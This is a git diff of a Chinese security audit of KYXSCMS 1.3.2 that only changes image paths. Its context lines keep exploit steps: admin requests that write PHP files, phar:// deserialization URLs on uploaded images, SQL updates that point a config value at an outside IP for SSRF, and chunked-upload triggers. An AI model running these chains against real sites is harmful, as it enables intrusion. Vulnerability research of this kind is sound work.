@@ -68,7 +68,7 @@ http://www.kyxscms132.com/admin/template/edit
 path=.feng.php&content=<?php phpinfo();?>
 ```
 
-![pic9](D:\this_is_feng\github\CTF\Web\picture\pic9.png)
+![pic9](KYXSCMS1.3.2审计与测试.assets/pic9.png)
 
 
 
@@ -78,7 +78,7 @@ path=.feng.php&content=<?php phpinfo();?>
 
 其实之前一直在考虑，既然是thinkphp5.1.33，是不是可以利用phar反序列化。但是找文件操作函数没找到。这里的写文件其实没法phar，因为前面的mkdir过不去：
 
-![pic10](D:\this_is_feng\github\CTF\Web\picture\pic10.png)
+![pic10](KYXSCMS1.3.2审计与测试.assets/pic10.png)
 
 ---------------------------------------------------------------------------------------------
 
@@ -101,7 +101,7 @@ path=phar://./uploads/config/20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png/123&c
 
 在后面再加一层目录就行：
 
-![pic15](D:\this_is_feng\github\CTF\Web\picture\pic15.png)
+![pic15](KYXSCMS1.3.2审计与测试.assets/pic15.png)
 
 又一处phar反序列化。
 
@@ -230,7 +230,7 @@ namespace {
 
 然后改后缀为png，然后在后台上传：
 
-![pic11](D:\this_is_feng\github\CTF\Web\picture\pic11.png)
+![pic11](KYXSCMS1.3.2审计与测试.assets/pic11.png)
 
 再phar反序列化即可：
 
@@ -238,7 +238,7 @@ namespace {
 http://xxxx/admin/template/edit?path=phar://./uploads/config/20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png
 ```
 
-![pic12](D:\this_is_feng\github\CTF\Web\picture\pic12.png)
+![pic12](KYXSCMS1.3.2审计与测试.assets/pic12.png)
 
 
 
@@ -346,7 +346,7 @@ sql=update {pre}config set value  = 'http://118.31.168.198:39456' where id = 92
 
 然后然后后台删除一下缓存文件：
 
-![pic13](D:\this_is_feng\github\CTF\Web\picture\pic13.png)
+![pic13](KYXSCMS1.3.2审计与测试.assets/pic13.png)
 
 可以尝试加上一行代码调试：
 
@@ -359,7 +359,7 @@ sql=update {pre}config set value  = 'http://118.31.168.198:39456' where id = 92
 
 可以看到`$url`可控：
 
-![pic14](D:\this_is_feng\github\CTF\Web\picture\pic14.png)
+![pic14](KYXSCMS1.3.2审计与测试.assets/pic14.png)
 
 因此存在SSRF漏洞。
 
@@ -602,7 +602,7 @@ http://xxxxxxxx/admin/upgrade/update
 
 即可成功写入：
 
-![pic16](D:\this_is_feng\github\CTF\Web\picture\pic16.png)
+![pic16](KYXSCMS1.3.2审计与测试.assets/pic16.png)
 
 ### 
 
@@ -612,7 +612,7 @@ http://xxxxxxxx/admin/upgrade/update
 
 当然这里同样可以phar反序列化，攻击方式和之前相同的，不多提了:
 
-![pic17](D:\this_is_feng\github\CTF\Web\picture\pic17.png)
+![pic17](KYXSCMS1.3.2审计与测试.assets/pic17.png)
 
 
 
@@ -687,7 +687,7 @@ cd ../
 echo "<?php phpinfo();?>" > 1.txt
 ```
 
-![pic17](D:\this_is_feng\github\CTF\Web\picture\pic18.png)
+![pic17](KYXSCMS1.3.2审计与测试.assets/pic18.png)
 
 
 
@@ -723,7 +723,7 @@ root@fab5a704a013:/var/www/html# echo "phar://./uploads/config/20210602/20a9e2a6
 
 
 
-![pic19](D:\this_is_feng\github\CTF\Web\picture\pic19.png)
+![pic19](KYXSCMS1.3.2审计与测试.assets/pic19.png)
 
 
 
@@ -835,7 +835,7 @@ http://www.kyxscms132.com/admin/upload/sublevel_upload
 status=chunkCheck&path=./uploads/config/&name=20210602&chunkIndex=20a9e2a63d2a1e5d42094af2ec61e42e.png
 ```
 
-![pic20](D:\this_is_feng\github\CTF\Web\picture\pic20.png)
+![pic20](KYXSCMS1.3.2审计与测试.assets/pic20.png)
 
 
 
@@ -882,7 +882,7 @@ sql=update {pre}config set value  = 'phar://' where id = 88
 
 然后清缓存：
 
-![pic13](D:\this_is_feng\github\CTF\Web\picture\pic13.png)
+![pic13](KYXSCMS1.3.2审计与测试.assets/pic13-16398019872731.png)
 
 然后phar开打：
 
@@ -892,7 +892,7 @@ http://www.kyxscms132.com/admin/upload/sublevel_upload
 status=chunksMerge&path=./uploads/config/&name=20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png&chunks=1
 ```
 
-![pic21](D:\this_is_feng\github\CTF\Web\picture\pic21.png)
+![pic21](KYXSCMS1.3.2审计与测试.assets/pic21.png)
 
 
 
